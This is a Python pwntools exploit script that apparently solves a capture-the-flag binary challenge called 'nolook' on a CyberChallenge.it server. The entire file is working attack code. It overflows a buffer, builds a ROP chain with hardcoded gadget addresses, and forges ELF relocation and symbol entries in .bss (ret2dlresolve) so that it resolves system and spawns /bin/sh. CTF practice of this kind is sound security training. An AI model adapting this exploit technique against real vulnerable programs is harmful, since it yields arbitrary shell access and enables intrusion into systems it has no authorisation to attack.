#!/usr/bin/env python3
from pwn import *
import time

bin_name = "./nolook_patched"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("nolook.challs.cyberchallenge.it", 9135)
    else:
        return process(elf.path)

def align(addr, base, size):
    return base + ((addr - base + size - 1) // size) * size

def main():
    r = conn()
    plt0 = elf.get_section_by_name('.plt').header.sh_addr

    jmprel = elf.dynamic_value_by_tag('DT_JMPREL')
    symtab = elf.dynamic_value_by_tag('DT_SYMTAB')
    strtab = elf.dynamic_value_by_tag('DT_STRTAB')

    readplt = 0x4004A0
    pop_rsi_r15 = 0x400681
    pop_rdi = 0x4005a7
    bssaddr  = elf.bss() + 0x200

    fake_rela_addr   = align(bssaddr,jmprel,24)
    fake_sym_addr    = align(fake_rela_addr + 24,symtab,24) 
    fake_string_addr = fake_sym_addr + 0x18 
    binsh_addr  = fake_string_addr + 0x8 

    reloc_index = (fake_rela_addr - jmprel) // 24
    sym_index   = (fake_sym_addr  - symtab) // 24
    st_name     = (fake_string_addr - strtab)

    r_offset    = elf.bss() + 0x80     
    r_info      = (sym_index << 32) | 0x7    
    fake_rela   = p64(r_offset) + p64(r_info) + p64(0)

    st_info     = 0x12                      
    fake_sym    = p32(st_name) + p8(st_info) + p8(0) + p16(0) + p64(0) + p64(0)

    payload = b"A" * 24 + flat(
        pop_rdi,
        0,
        pop_rsi_r15,
        fake_rela_addr,
        0,
        readplt,

        pop_rdi,
        binsh_addr,
        plt0,
        reloc_index
    )     

    tables = fake_rela 
    tables = tables.ljust(fake_sym_addr - fake_rela_addr, b'\x00')
    tables += fake_sym + b"system\x00\x00" + b"/bin/sh\x00" 

    r.send(payload)
    time.sleep(0.5)
    r.send(tables)
    
    r.interactive()

if __name__ == "__main__":
    main()
